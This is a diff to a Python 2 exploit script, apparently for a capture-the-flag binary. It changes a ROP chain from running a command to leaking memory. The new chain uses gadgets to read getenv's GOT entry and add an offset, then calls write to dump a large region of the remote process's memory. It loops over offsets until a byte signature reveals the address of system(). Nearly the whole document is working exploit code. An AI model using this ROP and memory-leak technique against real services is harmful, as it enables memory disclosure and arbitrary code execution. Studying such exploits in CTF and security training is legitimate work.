@@ -43,33 +43,40 @@ except:
 	exit(0)
 
 print "Stage 2 addr %x" % ropaddr
-
-def sploit(command):
+off = 0x7000
+while 1:
 	rop1 = []
 
 	existing = open("libc").read()
-
-	off = 0xbc20-14
 
 	rop2 = [
 		0x000000000041a318, #: pop rax; ret;
 		0x756020-0x10, # getenv_got
 		0x0000000000421db3, #: mov rax, qword ptr [rax + 0x10]; ret;
 
+
 		0x00000000004aaae9, #: pop rdi; ret;
 		u64(p64(off)), #offset on my libc
 
 		0x00000000004070ef, #: add rax, rdi; ret;
 
-		0x00000000004aaae9, #: pop rdi; ret;
-		ropaddr + 8*9,
+		0x0000000000407c2d, #: push rax; pop rbx; ret;
+		#makes rax=pop rax for the call
+		0x000000000041a318, #: pop rax; ret;
+		0x000000000041a318, #: pop rax; ret;
 
-		#0x4141414141414141, #: pop rdi; ret;
-		0x401cee, #call rax
+		0x000000000046d1f2, #: mov rsi, rbx; call rax;
+
+		0x00000000004aaae9, #: pop rdi; ret;
+		1,
+
+		0x00000000004f67f5, #pop rdx; ret;
+		0x3c0000, 
+
+		0x401826 # write
 		]
 
-	#command = "cat flag.txt"
-	rop2b = "".join([p64(i) for i in rop2]) + command + "\x00"
+	rop2b = "".join([p64(i) for i in rop2])
 
 	#set zero flag
 	rop1.append(0x000000000048c76f) #: xor eax, eax; ret;
@@ -112,7 +119,15 @@ def sploit(command):
 	s.clean()
 	s.sendline("0")
 
+	try:
+		s.readline()
+	except:
+		continue
 	s.readline()
 	s.readline()
 	buf = s.recv(0x3c0000)
-	print buf
+	print "scanning at %x" % (off,)
+	if p64(0xfa86e90b74ff8548) in buf:
+		print "FOUND SYSTEM! = %x" %(off+buf.index(p64(0xfa86e90b74ff8548)))
+		break
+	off += 0x400
